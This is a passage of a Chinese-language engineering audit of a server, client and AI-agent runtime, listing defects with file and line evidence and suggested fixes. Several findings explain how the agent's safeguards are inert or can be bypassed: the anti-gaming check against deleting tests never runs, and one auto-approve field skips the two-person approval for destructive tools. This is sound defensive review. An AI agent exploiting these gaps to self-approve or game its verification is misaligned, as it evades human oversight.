| REV-404 | 远端服务 | 中 | 构建/可移植 | 脚本 Windows 锚定且吞错：`curl.exe`、`-o NUL`、本机 `psql`（`:40,153,157`）在 ubuntu runner 上结构不可用；`Api()` 用 `try/catch` 把非 JSON 响应洗成"返回原始字符串"（`:42`），`curl -s` 无 `-f`，全程不比较 HTTP status → 4xx/5xx 被当正常继续 | ✅复核（`verify-e2e.ps1:30-42,153,157`） |
| REV-405 | 远端服务 | 中 | 数据/安全 | 验证产物目录 `Server/.verify-out`（`backup-verify.json`、`restore-payload.json`，内含真实账号的设置与记忆全文）**不在任何 .gitignore 内** → 有入库泄露风险 | ✅实证（`git check-ignore -v Server/.verify-out` → exit 1 未命中；产物路径见 `verify-e2e.ps1:13,84,115`） |
| REV-406 | 远端服务 | 低-中 | 测试有效性 | PowerShell `ConvertTo-Json -Depth 20` 的单元素数组塌陷：备份包里 `memories`/`stats.events` 恰为 1 条时，上行 body 变成对象而非数组，`restore` 语义分叉（脚本用 3 条数据掩盖了这一点） | △子代理（机制明确，需 pwsh 实跑确认，本轮无 Windows PowerShell 环境取证） |
| REV-407 | 远端服务 | 中 | 日志 | `db.ping()` 吞掉原始错误只返回 `false`（`pool.ts:89-96`），迁移 CLI 随即输出"无法连接数据库"却不带 host 与错误原因（`scripts/migrate.ts:23-28`）→ DNS 失败、口令错误、`pg_hba` 拒绝三种成因不可区分；两处连接串掩码正则还不一致（`[^@]+@` vs `[^@]*@`），空口令串 `postgres://@host` 不被掩码 | ✅复核（`pool.ts:89-96`、`scripts/migrate.ts:25`、`test/helpers/pg.ts:43` 三种写法逐行比对） |
| REV-408 | 远端服务 | 中 | 数据/错误语义 | 嵌套 `tx` 无 SAVEPOINT：`pool.ts:71` 让内层复用同一 client（避免二次 BEGIN——§18.3 据此判过"干净"，**此处更正其另一面**）——内层一旦抛错，外层事务被 PG 标记 aborted，后续语句全部 `25P02` 级联失败，真实原因被掩掉；同处 `close()` 是空实现、`ping()` 恒 `true`，事务内调用它们得到的是静默假成功 | ✅复核（`Server/src/db/pool.ts:67-88` 主审通读；§18.3 的对应"干净"表述按本条更正） |
| REV-409 | 远端服务 | 低-中 | 数据 | `device_kind` 失真：`bindDevice` 无 credential 时默认写 `'install'`，登录路径同形设备却写 `'legacy'`，DDL 无 CHECK 兜底 → 设备列表的"装机/遗留"语义不可信（前端设备面板直接展示该字段） | △子代理（`src/repositories/users.ts:166`、`src/services/authService.ts:574`、`migrations/003:28`） |
| REV-410 | 远端服务 | 低-中 | 数据/性能 | 中文记忆检索走 `ILIKE` 却无 `pg_trgm` 索引（001 只建了 FTS/GIN）→ memories 大表 seq scan；compose 的 `--locale=C` 进一步削弱中文排序 | △子代理（`src/repositories/memories.ts:196` ↔ `migrations/001:109-111`；`docker-compose.yml:22`；需 `EXPLAIN ANALYZE` 佐证） |
| REV-411 | 三端 | 中 | 孤岛/体验 | 云端能力面约六成**既无消费方也无验证**：主审对账后确认 Client 从不调用 `POST /v1/auth/change-password`、`PATCH /v1/me`、`DELETE /v1/me`、`GET /v1/me/audit`、`/v1/a2a/cards*`（含 bulk）、`GET /v1/stats/summary`、`GET /v1/stats/daily`、`DELETE /v1/settings`、`/v1/memories/:id` 三个单条动词；`verify-e2e.ps1` 也从不打 `/v1/tasks*`、`/v1/a2a/*`、`send-code`/`login-with-code` → 三个较新面零端到端覆盖。更直接的用户侧后果：`AccountPanel.tsx:137` 在下载失败时提示用户"可改用服务端 `/v1/backup/download`"，而**该路由在客户端从未被接线**（`serverApi.ts:254` 只在注释里提到它返回裸响应）→ 指给用户一条 UI 里走不通的路 | ✅复核（主审 `grep -rno "/v1/..." Client/src` 全量对账，得 22 个路径串；`/v1/backup/download` 仅 2 处命中且都是注释/文案：`serverApi.ts:254`、`AccountPanel.tsx:137`）· 与 REV-349/373 不重复（那两条是"POST 打 DELETE 路由"与部分孤岛路由，本条是完整对账结论 + 文案指向未接线路由） |
| REV-412 | 远端服务 | 低-中 | CI | 80% 覆盖率门槛只按根 vitest 的 include（`Src` + ai-components）计算，Server 既无 coverage 依赖也无 coverage 脚本 → 云端可在**零覆盖**下让 CI"达标" | △子代理（`vitest.config.ts:26`、`ci.yml:36-41`、`Configs/coverageBaseline.json:2`） |

小计：REV-384~412 共 **29 条**——严重 1 · 高 5 · 中高 5 · 中 13 · 低-中 5。取证强度：`✅复核/✅实证` 覆盖全部 严重/高/中高 与 13 条 中里的 9 条，`△子代理` 8 条（集中在具体 spec 行号与需 `EXPLAIN`/`pwsh` 的项，修复前抽样）。

### 19.2 逐条要点（需要交代机制的）

- **REV-384 的三重叠加**是本轮最该先讲清的机制：① `pg.ts:36` 的 `catch { available = false }` **不分成因**——端口不通、口令错、迁移抛错、checksum 漂移全被归为"无库"；② 每个集成文件顶部的 `const d = dbAvailable ? describe : describe.skip` 让 vitest 把它们记为 skipped，退出码仍是 0；③ 默认串 `postgres://postgres@127.0.0.1:55432/civitas_server_test` 与 compose 的 `5432/civitas_server` 不同名不同端口，README 两条路径各对一半（`:68` 端口对、库名对；`:33` 端口对、库名错），**没有任何一种"照文档做"的组合能撞上默认串**。三者合起来意味着：这套测试对任何人都是"跑不到且不报错"，于是 §18 里那批 严重/高 缺陷没有一条曾在 CI/本地被红灯拦下。
- **REV-386 的自放大**：漂移用例（`platform.spec.ts:138-172`）是集成套件里唯一触碰 `schema_migrations` 的写操作，它把篡改后的 checksum 留在**共享库**里；下一个文件的 `getTestDb()` → `isDbAvailable()` → `runMigrations(probe)` 抛 `checksum 不一致` → 落进 REV-384 的 catch → 剩余全部 skip 且全绿。修法不是加断言，而是把复原放进 `finally` **并**让探测区分"库不存在"与"迁移失败"（后者必须 fail-fast）。
- **REV-394 的两处"把缺陷写成期望值"**：`platform.spec.ts:116-125` 断言 2MB 上行必得 413——这正是 REV-357 描述的"备份导得出来、restore 装不回去"，测试把它固化成契约；`auth.spec.ts:197-198` 用 session UUID 冒充 refreshToken，得到 401 于是认为"吊销生效"，实际走的是"哈希查不到"分支，`revokeById`/`revokeFamily` 全坏也不会红。**修 §18 那两条时必须同时改这两处断言**，否则修复会被"回归测试"判定为破坏契约。
- **REV-390 的半迁移窗口**：`pending` 列表在循环前一次性算出（`migrate.ts:99`），因此同一 version 的两个文件都留在列表里；第一个文件 `db.tx` 成功并提交，第二个在 INSERT `schema_migrations` 处撞 PK（`version` 是主键，`migrate.ts:58`）→ 只回滚第二个文件。结果是 DDL 半落地 + CLI 报错退出，运维再跑一次会因"006 已应用"而**永久跳过第二个文件**。这是"文件命名自由度"与"version 取前缀"之间的隐式契约，至少要加唯一性校验。
- **REV-392 的三种错位**同时存在：语义（服务端主机指纹 ≠ 用户设备）、门禁（无环境判定即可写生产库）、事实（宣称的 888888 后门不存在）。三者里最危险的是第三种——它的失败方向是"运维去代码里补一个固定码"。
- **REV-402/403/404 是同一条**的三个面：一个号称端到端验证的脚本，断言只有 3 条、退出码恒 0、失败只变色、清库靠硬编码 psql、环境变量声明了不读、非 JSON 响应被吞、只能在 Windows 跑、没有任何调用方。它现在的作用是给 README/设计文档提供"已有 E2E"的措辞支撑。

### 19.3 已核对为干净（M14 新增，后续勿重复排查）

- **迁移器的核心事务语义正确**：每个文件独立 `db.tx`，DDL 与 `INSERT schema_migrations` 同事务（`migrate.ts:112-118`）→ 不存在"执行了没记录"或"记录了没执行"；失败必回滚不记录。
- **checksum 漂移检测的覆盖面**：在取 pending 之前对**全部**磁盘文件比对已应用记录（`migrate.ts:88-96`）→ 修改历史迁移文件内容会被拒（且有测试 `platform.spec.ts:157-160`）。
- **多语句 `.sql` 能执行**：`db.execute(sql)` 传空参数数组，pg 的 `requiresPreparation()` 为 false → 走 simple query，不触发 extended-protocol 的多语句限制（`pool.ts:42-45`）。
- **6 个迁移全部幂等可重入**：清一色 `CREATE TABLE/INDEX IF NOT EXISTS`，无 `CREATE TYPE`、无种子 `INSERT`；002/003 往存量表加列要么可空要么带 `DEFAULT`，不会因存量行失败。
- **`refresh_tokens.token_hash` 确为 `NOT NULL UNIQUE`**（`migrations/001_init.sql:33`）→ `findByHash` 的唯一假定成立，REV-350 的双花分析不受约束缺失影响（双花源于逻辑序而非缺唯一性，两条并发插入的是**不同** hash）。
- **`ON CONFLICT` 目标逐一对上真实约束**：`memories.ts:69`↔001:102-104（partial index 的 WHERE 与语句的 predicate 一致）、`stats.ts:46`↔001:72-74、`users.ts:150`↔002:53、`tasks.ts:34`↔005:23、`a2a.ts:74/163`↔006:40/69、`rateLimit.ts:147`↔004:13。
- **值域与时间类型一致**：`status`/`assertion`/`purpose` 的 zod enum 与 DDL CHECK 同集合；`timestamptz` 一律用 `Date`/`now()`，`bigint` epoch ms 经 `pool.ts:13` 的 int8 parser 成 Number，`user_settings.revision` 同理；`stats` 的 SUM 已 `::float8` 避开 numeric 字符串。
- **索引支撑基本到位**（REV-410 除外）：stats 区间聚合命中 `usage_events_user_time_idx`、a2a 游标命中 `idx_a2a_user_cursor`、FTS 查询表达式与 001 索引表达式逐字相同。
- **`loadMigrations` 过滤了非 `.sql`**（`migrate.ts:41`）→ 目录里的 `.gitkeep`/编辑器临时文件不会被当迁移读。
- **CLI 的错误路径不跳过清理**：`scripts/migrate.ts` 的 `finally { await db.close() }` 在 `main().catch` 之前完成，无 exit-vs-flush 竞态。
- **单元测试里该有的都有**：生产 fail-closed 配置断言（`config.spec.ts:72-119`）、argon2 加盐与损坏哈希不抛、篡改/过期令牌错误码可区分、刷新令牌哈希稳定与家族唯一、限流算法本身传 `now` 而非 sleep、游标非法输入。
- **集成用例的隔离骨架正确**：`fileParallelism:false` + 每用例前 `truncateAll` + `afterAll closeTestDb` 三者在 10 个文件里写法统一（除 REV-401 的表清单遗漏）。
- **compose 的 db healthcheck 是真探测**（`pg_isready`，`docker-compose.yml:26-30`）。
- **`Server/package-lock.json` 已入库、`Server/node_modules` 被 `Server/.gitignore:1` 忽略**。
- **`Server/tsconfig` 严于根口径**：`noUncheckedIndexedAccess`/`noUnusedLocals`/`noUnusedParameters`/`forceConsistentCasingInFileNames` 全开，且 `test/**`、`scripts/**` 纳入 tsc（`tsconfig.json:8-20`）——这是本仓唯一被类型严格覆盖的两处非 `Src/` 代码，修复时**不要为省事放宽它**。
- **前端↔云端 路径与字段对账**（除 REV-349/411 外）：19 个前端调用点全部命中已注册路由，无新增 404 或动词错配；`tokenType/accessExpiresAt/refreshExpiresAt/boundDeviceId/firstSeenAt/isPrimary` 等字段两端逐条对齐；`a2a since` 参数贯通（`a2aSync.ts:199`↔`schemas.ts:301`↔`routes/a2a.ts:36`）；分页与批量上限不越界（`syncService.ts:306,362,432,477` ↔ `validate.ts:65`、`schemas.ts:157,171,296`）。
- **`electron` 侧 URL 策略有测试**：`Tests/Interface/desktopUrlPolicy.spec.ts` 17 例覆盖自托管账号源的放行/拒绝。
- **§18.3 的一处表述按 REV-408 更正**：嵌套事务"不再发二次 BEGIN"是真的，但结论"restore 全链路真原子"要加限定——内层抛错后外层进入 aborted，后续语句以 `25P02` 级联失败，**回滚方向仍正确**（不会半提交），失真的是错误原因。

### 19.4 归批建议（并入 §16.3 与 §18.4，不另立批次体系）

| 工单 | 合并条目 | 位置与理由 |
|---|---|---|
| **P0-5 云端凭据面止血**（§18.4 已立） | 追加 REV-388 | compose 的数据库暴露与 REV-356（应用无 TLS）同属"云端凭据在网络上裸奔"，一起改口径才不会改一半 |
| **新增 P0-6 云端验证面接通** | REV-384 + 385 + 386 + 401 + 402 | 这一批的产物是"让 `Server/` 第一次真正被跑过"：探测区分成因、端口/库名统一（或 compose 加第二个 db 服务）、篡改复原进 `finally`、`truncateAll` 改为按 `information_schema` 动态取表、CI 用现成的 `npm run server:test` + `services: postgres`。**必须排在所有 §18/§19 修复之前**——否则每条修复都无法自证 |
| **P1-9 令牌与身份权威**（§18.4 已立） | 追加 REV-394 + 396 | 修 REV-350/353/354 时必须同批加并发用例、把"用 sessionId 冒充 refreshToken"改成真令牌双花断言，否则修完仍是无拦截网 |
| **新增 P1-10 云端数据演进加固** | REV-389 + 390 + 391 + 407 + 408 | 迁移器加 `lock_timeout`/咨询锁/version 唯一性校验/缺失文件告警；`ping` 与 CLI 保留原始错误；嵌套 tx 用 SAVEPOINT 或显式禁止嵌套 |
| **P2-5 云端一致性与可观测性**（§18.4 已立） | 追加 REV-395 + 397 + 398 + 399 + 400 + 409 + 410 + 412 + 406 | 测试装配与运行形态对齐（至少一套"生产阈值"用例）、安全分支补测、审计断言、mailTransport 覆盖、时序解耦、DDL 约束与索引 |
| **孤岛（并入 P2-1）** | REV-403 + 404 + 405 + 411 + 387 + 392 + 393 | `verify-e2e.ps1` 二选一：给它调用方与退出码，或删掉并停止引用；`.verify-out` 入 `.gitignore`；Server 的可交付形态（Dockerfile 或 compose app 服务）；`seed:dev` 的跨线依赖与环境门禁 |

**附注（文档漂移，不立项但集中记此，供修复后一次性回写）**：`Server/README.md` §3 接口一览漏列 8 条在用路由并把 devices 归类错、§7 "限流进程内、多实例换 Redis"与 §2 的 `RATE_LIMIT_STORE=postgres` 自相矛盾、§9 "客户端接入未做"已被 `Client/src` 实现推翻、测试库搭建步骤与默认串互斥（REV-384 的文档面）；`verify-e2e.ps1` 头注的用法路径写成 `Scripts/verify-e2e.ps1`（实为 `Server/scripts/`）；`.env.example` 缺 `TRUST_PROXY`、`STATS_TIMEZONE` 与 `config.ts:204` 默认值不一致（示例 `Asia/Shanghai` vs 代码 `UTC`，而 `stats.spec` 的分桶断言依赖前者）；`pool.ts:12` 注释说"int8 保持原样"但代码已转 Number。

### 19.5 本轮无法取证、必须真实环境或人工验证的项（补 §16.4 与 §18.5）

| 待验证项 | 关联条目 | 需要的动作 |
|---|---|---|
| 14 个 spec 在有库环境是否真的全绿 | REV-384（前置） | 起 PG 并让 `TEST_DATABASE_URL` 与之对齐后跑 `npm run server:test`，比对 skipped 数（本轮全程 0 次集成执行） |
| 001 GIN / 003 ALTER 在存量库的耗时与 15s 超时 | REV-389 | 灌种子数据后 `npm run migrate`，并观察 `pg_locks` |
| 中文 `ILIKE` 与 stats 聚合是否真走索引 | REV-410 | `EXPLAIN (ANALYZE, BUFFERS)` |
| `verify-e2e.ps1` 的真实退出码与 `psql`/`curl.exe` 缺失时的行为 | REV-402/403/404 | Windows + pwsh 实跑（本轮未执行任何 PowerShell 脚本） |
| PS 单元素数组塌陷是否真的破坏 restore | REV-406 | 构造只含 1 条记忆的备份包上行 `/v1/restore` |
| CI 加 `services: postgres` 后的可行性 | REV-385/P0-6 | 需要一次真实 workflow 运行（本仓无法本地取证） |
| `rate_limit_buckets` 跨轮泄漏是否已实际污染某条限流断言 | REV-401 | 连续两轮 `npm test` 比对同一断言 |

### 19.6 一句话结论

M14 的实质不是"测试写得不好"，而是**这条部署线至今没有任何形式的验证门禁**：集成测试因端口/库名错位而静默跳过（REV-384），CI 三个 job 全在仓库根且六条 `server:*` 入口零使用（REV-385），唯一的端到端脚本恒退 0 且无人调用（REV-402），覆盖率门槛按根 include 计算（REV-412）——于是 §18 那 35 条缺陷里没有一条曾被红灯拦下，而 `Server/tsconfig` 严格程度全仓第一（19.3）。**修复顺序上，P0-6「让云端真正被跑一次」必须早于一切云端修复**，否则每条改动都是在无观测点的系统上盲改。

---

## 20. M15 内容资产面与三端接线（`Prompts/` · `Skills/` · `Benchmarks/` · `Configs/` 对应段）（REV-413~427）

> 切片：`Prompts/{roles,system,tasks,versions}`、`Skills/{playbooks,rubrics,rules,strategies}`、`Benchmarks/{baselines,datasets}`、`Configs/{security,loopConfig,modelRouter}.json` 中与资产相关的段，以及消费它们的 `Src/Services/Prompts/**`、`Src/Services/LoopControl/verifier/**`、`Src/Services/ReviewerAgent/**`、`Src/Services/Recruitment/**`、`Src/Core/AgentRuntime/agentFactory.ts`、`Src/Core/Loop/runIteration.ts`、`Src/Core/Decision/orchestrator/orchestrator.ts`、`Src/main.ts`、`Src/Interface/{IpcBridge,RestApi}/**` 与 `Client/src/config/configSchema.ts`。
> 本子代理报告的三处结论经复核后**不成立/已重复**，未立项：`getL3Calibration()` 并非"符号缺失"（定义在 `skillsAssets.ts:169`，只是零调用，已按事实登记为 REV-422）；`Skills/rules/behaviorCode.md` 的执行侧缺陷已由 **REV-080**（`checkViolation` 忽略 `action/severity` ⇒ `enforceable` 规则全是装饰）与 **REV-084**（运行期立法只在内存、重启回落 `DEFAULT_RULES`）覆盖，本片只补"资产双源"那一半（REV-424）；`pathGuard` 的 `~/.ssh` 已由 **REV-039** 覆盖；打包双份 `Prompts/Skills` 与 `resources/app` 保留名已由 **REV-284/REV-298** 覆盖。
> 证据标注：本章 15 条**全部 `✅复核`**（主审逐文件读过代码），REV-422 另附 `✅实证`（实跑 `npx tsc`）。

| ID | 层 | 严重度 | 类别 | 现象 · 证据 · 影响 · 修复 |
|---|---|---|---|---|
| REV-413 | 服务+桌面 | 高 | 交互逻辑/业务语义 | **每一轮普通对话的系统提示词自我矛盾**：`Src/Interface/IpcBridge/ipcBridge.ts:1131` 把交互链路的 `agentRole` 钉死为 `'prime_director'` → `Src/Core/Loop/runIteration.ts:494-496` 用 `getRolePrompt(ctx.agentRole)` 现取角色段发给模型，而 `Prompts/roles/prime_director.md:19` 写的是"你不直接执行具体编码/文件操作，而是通过 Worker 完成"、`:26-39` 规定输出**只能是 assignments JSON**、`:3` 还带温度/迭代/预算等运行参数；紧接着 `runIteration.ts:74-91` 的静态段是 "Read, write and edit files; run shell commands…"，`:113-117` 再附完整工具目录。影响：用户每发一条消息，模型先被告知"禁止动手且只准回 JSON"，再被告知"你可以读写文件跑命令"——两个指令互相否证，输出格式契约（JSON）与实际期望（自然语言+工具调用）也冲突，且这是主链路的**默认**行为而非异常分支。修复：交互对话路径改用与"直接执行"语义一致的角色段（或干脆不带角色段），把 `prime_director.md` 的输出契约限定为"仅编排入口调用"；同时删掉角色文件里的运行参数行（温度/预算归 `Configs`）。 | ✅复核 |
| REV-414 | 服务 | 中高 | 提示词真源分裂 | **Playbook 从未进过模型，但被当成 Agent 的提示词落了库**：`Src/Core/AgentRuntime/agentFactory.ts:73-84` 把 `getPlaybook('taskExecution')` 拼进 `systemPrompt` 存进实体，`:93` 随实例返回，`Src/Services/Recruitment/recruiter.ts:66` → `Src/Infra/Db/Repositories/agentRepository.ts:91` 写入 `agents.system_prompt`；而实际发送内容由 `runIteration.ts:496` 独立拼装（`buildStableSystemPrompt:102-117` 的组成是 角色段+静态段+系统资产段+工具目录，**不含 playbook**）。全仓 `.systemPrompt` 的读取点只有 `agentRegistry.ts:150`（诊断快照）与 `recruiter.ts:66`（落库），无任何 LLM 调用方；`Client/src` 全域无 `system_prompt` 引用，所以既不发送也不展示。影响：`Skills/playbooks/taskExecution.md` 整份 SOP（十步序列、策略记录、预算自查）是纯装饰；同时库里的"提示词审计列"与真实发送内容长期不一致，任何将来"从库重建上下文"的实现都会拿到错的那一份。修复：让 `runIteration` 优先使用实体上的 `systemPrompt`（或把 playbook 作为独立段并入 `buildStableSystemPrompt`），二者只能留一个真源。 | ✅复核 |
| REV-415 | 服务+资产 | 中 | 资产孤岛 | **`assembly_node` 角色永不被装载**：`Src/Core/Decision/orchestrator/orchestrator.ts:557`（ASSEMBLY_LINE 分支）对每个流水线节点一律 `createAgent({ role: 'worker', … })`，而 `Prompts/roles/assembly_node.md` 存在、`Configs/security.json:6` 把 `assembly_node` 列进 `externalRoles`、`agentFactory.ts:28` 的 `EXECUTION_ROLES_WITH_PLAYBOOK` 也把它算作执行级角色。影响：流水线节点拿到 Worker 的角色段（"按 Assignment 独立完成"），与 ASSEMBLY_LINE 的"只消费上一节点产物、不得回退"语义无交集；除 `getLoadedRoles()` 诊断外，该文件的差异永远不会被任何人看到。同类：`arbitrator/auditor/regulator` 只在治理路径按名查询，需一并确认口径。修复：按 `route` 传 `role:'assembly_node'`，或删掉该资产并在文档中说明流水线复用 worker 段。 | ✅复核 |
| REV-416 | 服务+资产 | 中 | 日志与可观测性 | **提示词/技能退化零告警**：`Src/Services/Prompts/promptRegistry.ts:43` `if (!content) continue;`（空文件静默不装载，`:55` 的 `count` 只是少 1）、`:100-107` `loadSystemAssets` 对 `mainLoop.md`/`defaultTask.md` 用裸 `catch { systemMainLoop = null }`、`:122` 对 `versions/manifest.json` 只做存在性检查（版本号仅记日志）；`Src/Services/Prompts/skillsAssets.ts:80` 空 playbook 静默跳过、`:100-106` rubric 非数组时静默返回 null。影响：把角色文件清空、把 JSON 结构改错、`~/.ssh` 式的路径漂移，运行期表现都只是"提示词少了一段"，既无 warn 也无事件，前端与日志都看不出这一轮少用了什么。修复：装载数量/清单与 `manifest.json` 做对账并 `logger.warn` 以上；结构校验失败即 fail-fast 或显式降级事件。 | ✅复核 |
| REV-417 | 服务 | 中 | 热重载语义 | **提示词热重载只能新增和修改，不能清空和下线**：`Src/main.ts:420-441` 的文件监听在命中 `Prompts` 时只调 `loadRolePrompts()` + `loadSystemAssets()` + `resetSystemPromptCache()`；`promptRegistry.ts:38-53` 的 `loadRolePrompts` 对 `rolePrompts` **只 set 不 clear**（`resetRolePrompts:70` 注释自陈"测试/诊断用"，无任何生产调用点）。影响：把某角色文件改成空内容时 `:43` 直接 `continue`，注册表里旧提示词继续生效且日志报"装载完成"；删掉文件同理。用户以为改了，模型用的还是旧的那份。`Skills/` 侧只重跑 `configureStrategyCandidates`（`main.ts:436`），playbook/rubric 无重装载入口，`Skills` 变更须重启进程。修复：重装载入口先 `resetRolePrompts()` 再装载，并给出"下线/清空"与"解析失败"两种结果的区分日志。 | ✅复核 |
| REV-418 | 三端 | 高 | 业务语义/空转旋钮（F5） | **设置页"推理三明治"四个控件全部无效**：`Configs/modelRouter.json:55-63` 的 `reasoningSandwich.{enabled,planningTier,actingTier,verifyingTier,fallbackOnBudgetSoft}` 在 `Src/**` 内**零消费者**（全域仅 `Src/Infra/Config/userConfigWriter.ts:54,89` 把它当作可写段前缀与锁定项）；`Client/src/config/configSchema.ts:104-107` 却给了 1 个开关 + 3 个 segmented，并标注"验证档位不得降为 economic（软预算降级也必须保留强验证）"。影响：用户切换"规划档位=经济模型"后，实际请求模型仍由 `routing.{default,director,worker}Model` 决定，档位与 `fallbackOnBudgetSoft` 都不参与；一条被写成红线的治理约束（强验证不可降级）没有任何代码承接。同时 `Prompts/system/mainLoop.md:4` 自称"采用 Reasoning Sandwich 结构"，资产口径与代码相反。修复：要么按 `phase` 接三档并让 `verifyingTier` 成为硬约束，要么从设置页与配置里撤掉这一段。 | ✅复核 |
| REV-419 | 三端 | 高 | 安全/业务（空转旋钮，F5） | **"验证·防刷改动上限"滑块不接任何执行路径**：`Configs/loopConfig.json:52-53` 的 `antiGamingMinRules:1` / `antiGamingMaxChangedFiles:8` 无任何读取点（`Src/main.ts:743` 只读 `verifier` 的 `minLevelsRequired`）；`Src/Services/LoopControl/verifier/antiGaming.ts:19-20` 的 `{minRules,maxChangedFiles}` 只被 `Tests/LoopControl/loopControl.spec.ts:326` 与 `Tests/Experiments/adversarial/security.spec.ts:145` 以字面量传入，`validateAntiGaming`/`checkAntiGaming` 的**生产调用点为 0**（`Src/Services/LoopControl/index.ts:40` 只做再导出）；`Client/src/config/configSchema.ts:79` 把上限做成 1~50 的滑块，描述写"单轮改动文件数超过即视为绕过"。影响：反博弈（"所有测试通过"→"测试文件未被改动 + 改动文件数≤8"）这条防止 Agent 靠删测试刷分的安全门，运行期根本不存在，而 UI 明示它可调 → 用户以为有护栏。修复：把两个 knob 接进验证管线（L2 之后、L3 之前），或撤掉 UI 控件并在文档降级为"设计意图"。 | ✅复核 |
| REV-420 | 服务+桌面 | 高 | 安全（治理红线可被一个字段关闭） | **CRITICAL 双角色策略可被配置整体绕过**：`Src/Services/LoopControl/middleware/toolSafetyGate.ts:335-341` 一旦 `cfg.autoApproveTools.includes(toolName)` 即调 `forceApprove(approval.approvalId, 'policy:auto-approve', 'auto_approve_policy')`，而 `Src/Services/LoopControl/approvalGate.ts:386-411` 的注释与实现都明确"**忽略多人/双角色策略**"，直接把 PENDING 置 APPROVED 并唤醒工具。白名单来源 `Configs/security.json:19-23 autoApprove.tools`（当前为 `[]`）→ `Src/main.ts:258`。三重缺口：① 无工具范围护栏——`file.delete`/`shell.exec` 等不可逆工具同样可写进白名单；② 与 §15 已实证的 CRITICAL 双人红线（`rolesSatisfiedByDistinctIdentities`，`quorumBlocked:{required:2,matched:1}`）互斥，一个 JSON 字段即可整体关掉"单人不得自批"；③ `decidedBy` 里进的是 `'policy:auto-approve'` 这个**非身份串**，与 `role:identity` 约定不同源，审计侧无法区分人批与策批（叠加 REV-082 的台账缺口）。与 **REV-057** 互补：那条登记的是"这个开关看不见也关不掉 + `auto` 字段退化"，本条登记的是"它一旦打开能绕过什么"。修复：白名单只允许 `riskLevel < CRITICAL` 的工具、CRITICAL 一律强制人工，且 `forceApprove` 对 CRITICAL 直接拒绝。 | ✅复核 |
| REV-421 | 服务+资产 | 中 | 业务语义 | **策略台账只做文案，不做决策**：`Skills/strategies/candidates.json` 每条带 `id/category/applicableWhen/riskLevel` 四个维度，但 `Src/main.ts:409,436` 与 `Src/Core/Loop/runIteration.ts:897` 三处一律 `.map(c => c.strategy)` 只取文本；`Src/Services/LoopControl/strategyLedger.ts:112-122` 取 `available[0]`（无按 `riskLevel` 优先、无按 `applicableWhen` 匹配）；`runIteration.ts:896-906` 把选中的策略**只拼进 `stopDecision.detail` 字符串**，外层是裸 `catch { /* fail-soft */ }`。影响：`no_progress → switch_strategy` 的"自动轮换"实为退出详情里的一句"建议替代策略: X"，没有任何代码路径据此改变下一轮行为、也没有 `recordStrategy` 把上一次选择记为失败；候选集越丰富（MEDIUM 风险项）与低风险提示的排序关系越不明。修复：把选择结果写回 Assignment/下轮上下文并 `recordStrategy`，`category/applicableWhen/riskLevel` 参与排序或被删除。 | ✅复核 |
| REV-422 | 服务+资产 | 中 | 指标口径（F4）/资产孤岛 | **L3 校准资产不可跑也不可校验**：`Src/Services/Prompts/skillsAssets.ts:169 getL3Calibration()` 全仓零调用；`:177-181 getL3Rubric()` 把权重拼成自然语言 `名称（权重 0.4）：描述`，由 `Src/Services/ReviewerAgent/reviewerAgent.ts:168,176` 当 rubric 使用 → 权重数值不再具备任何约束力；`Skills/rubrics/verifierL3Calibration.json` 人评用 0-100、judge 用 0-1（`Src/Services/LoopControl/verifier/llmJudge.ts:96-107` prompt 声明 "0.0-1.0 scale" 并以 `score >= minScore` 判定），两套标度混在同一文件且 `calibrationTarget.minSamples:50` 而样本仅 5 条；`Scripts/rubricRecalibrate.ts:113` 的 `` `…${(x*100).toFixed(1)}%` `` 模板串编译不过，`npx tsc` 实跑 `error TS1109: Expression expected.`（该问题在 `Docs/Agent/15-实验矩阵与评估/实验矩阵设计.md:228` 标为"本轮不改"，但从未进本登记器）。影响：所谓"Judge 与人评一致率校准"链路既跑不起来也无法量化，L3 的 pass 判定完全依赖 judge 自报分数与一个无标定来源的 `minScore`。修复：统一标度、让权重参与评分聚合、修 `rubricRecalibrate.ts` 编译错误并把校准结果接进 `minScore` 决策。 | ✅复核 · ✅实证（`npx tsc` 复现 TS1109） |
| REV-423 | 三端 | 中 | 交互逻辑（路由结构不可达） | **技能详情接口结构上永不匹配**：`Src/Interface/RestApi/skillsApi.ts:49` 与 `Src/Interface/IpcBridge/ipcBridge.ts:1446` 都把 id 生成成带斜杠的 `"playbooks/taskExecution"`，而 `Src/Interface/RestApi/router.ts:58-63` 将 `:id` 编译为 `([^/]+)`（排除斜杠）⇒ `GET /api/skills/:id`（`skillsApi.ts:73`）对真实 id 恒不命中，`:76-78` 的 `category/name` 拆分与 400 分支是死码。当前 `Client/src/services/ipcApi.ts:291` 只走 IPC 所以无人撞上，属"REST 侧写了但没人能调通"的孤岛（F5）。另：`listSkills` 在 REST 与 IPC 各有一份实现且都只列 `.md`，`Skills/strategies/candidates.json`、`Skills/rubrics/verifierL3Calibration.json` 不在任何清单里 → 面板看不到运行期真正生效的两份配置资产。修复：路由参数支持带斜杠（`:id(*)` 或改 `([^/]+(?:/[^/]+)?)`），两处 `listSkills` 合一，并扩展 JSON 类资产。 | ✅复核 |
| REV-424 | 资产+服务 | 中 | 资产双源漂移 | **人读法典与执行规则两套编号、互不相关**：`Skills/rules/behaviorCode.md` 全仓零消费者（`Src/Services/Regulation/**`、`Src/main.ts` 均无引用），其条目为 `R-001 目标忠诚 / R-002 资源守恒 / R-003 安全边界 …`；而 `Src/Services/Regulation/behaviorCode.ts:45-63 DEFAULT_RULES` 是 `safety-001 / safety-002 …` 且条件串（`agent.access(other_agent.private_context)`）与 md 的表述无对应关系。`listSkills` 又把 `behaviorCode.md` 当"技能"列进面板（`ipcBridge.ts:1446` 的 `rules` 分类）→ 用户在技能页读到一份不会执行的规则，还把它当成可用能力。影响与 **REV-080**（`checkViolation` 忽略 `action/severity`，`enforceable` 全是装饰）、**REV-084**（运行期立法不落库，重启回落 `DEFAULT_RULES`）叠加后，"行为准则"这一治理面从资产→装载→执行三处都无一致性。修复：二选一为真源（建议 md 作可读说明并生成规则，或规则入库并渲染成 md），面板分类不要把治理法典当技能列出。 | ✅复核 |
